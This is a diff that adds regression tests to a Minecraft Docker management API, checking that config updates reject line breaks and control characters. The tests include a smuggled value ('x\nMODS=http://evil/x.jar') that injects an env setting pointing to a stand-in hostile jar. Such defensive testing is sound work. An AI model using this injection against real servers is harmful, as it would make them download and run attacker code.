@@ -1,6 +1,9 @@
 import { describe, it, expect, beforeAll, afterAll, vi, beforeEach } from 'vitest';
 import { FastifyInstance } from 'fastify';
 import { buildApp } from '../src/app.js';
+import { EnvValueError } from '@minecraft-docker/shared/utils';
+import { ServerConfigSchema } from '../src/schemas/config.js';
+import { ConfigService } from '../src/services/ConfigService.js';
 
 // Mock child_process module first
 vi.mock('child_process', async (importOriginal) => {
@@ -542,6 +545,83 @@ GID=1000
         });
 
         expect(response.statusCode).toBe(200);
+      });
+    });
+
+    // config.env is the container's env_file: a line break in any text value
+    // would add a setting such as MODS=<url> (#726)
+    describe('single-line values (#726)', () => {
+      const STRING_FIELDS = Object.entries(ServerConfigSchema.properties)
+        .filter(([, schema]) => (schema as { type?: string }).type === 'string')
+        .map(([field]) => field);
+
+      it('covers every free-text field', () => {
+        expect(STRING_FIELDS).toEqual(expect.arrayContaining([
+          'motd', 'level', 'seed', 'icon', 'initMemory', 'maxMemory', 'jvmXxOpts', 'tz',
+          'resourcePack', 'resourcePackSha1', 'resourcePackPrompt', 'rconPassword',
+          'websocketAddress', 'websocketPassword', 'websocketAllowedOrigins',
+          'paperConfigRepo', 'pufferfishConfigRepo', 'purpurConfigRepo', 'serverPropertiesRepoUrl',
+        ]));
+      });
+
+      it.each(STRING_FIELDS.flatMap((field) => [
+        [field, 'x\nMODS=http://evil/x.jar'],
+        [field, 'x\rMODS=http://evil/x.jar'],
+        [field, 'x\u0000y'],
+        [field, 'x\u001by'],
+      ]))('rejects %s=%j with 400 without writing config.env', async (field, value) => {
+        mockedServerExists.mockReturnValue(true);
+
+        const response = await app.inject({
+          method: 'PATCH',
+          url: '/api/servers/testserver/config',
+          payload: { [field]: value },
+        });
+
+        expect(response.statusCode).toBe(400);
+        expect(mockWriteFileSync).not.toHaveBeenCalled();
+      });
+
+      it.each([
+        { motd: '§6Welcome §lto my server§r - have fun!' },
+        { motd: 'A Minecraft Server, v2 (beta) & friends' },
+        { seed: '-9223372036854775808' },
+        { seed: 'a text seed with spaces' },
+        { icon: 'https://example.com/icon.png' },
+        { resourcePack: 'https://example.com/pack.zip?v=1&dl=true' },
+        { resourcePackPrompt: 'Please accept the pack!' },
+        { jvmXxOpts: '-XX:+UseG1GC -XX:MaxGCPauseMillis=200' },
+        { tz: 'Europe/Berlin' },
+        { rconPassword: 'p@ss w0rd!$#' },
+        { websocketAllowedOrigins: 'http://a.example,https://b.example' },
+      ])('accepts %j', async (payload) => {
+        mockedServerExists.mockReturnValue(true);
+
+        const response = await app.inject({
+          method: 'PATCH',
+          url: '/api/servers/testserver/config',
+          payload,
+        });
+
+        expect(response.statusCode).toBe(200);
+        expect(mockWriteFileSync).toHaveBeenCalled();
+      });
+
+      it('returns 400 when the config.env writer rejects a value', async () => {
+        mockedServerExists.mockReturnValue(true);
+        const spy = vi.spyOn(ConfigService.prototype, 'updateConfig').mockImplementationOnce(() => {
+          throw new EnvValueError('MOTD');
+        });
+
+        const response = await app.inject({
+          method: 'PATCH',
+          url: '/api/servers/testserver/config',
+          payload: { motd: 'Updated MOTD' },
+        });
+
+        spy.mockRestore();
+        expect(response.statusCode).toBe(400);
+        expect(response.json()).toMatchObject({ error: 'BadRequest' });
       });
     });
   });
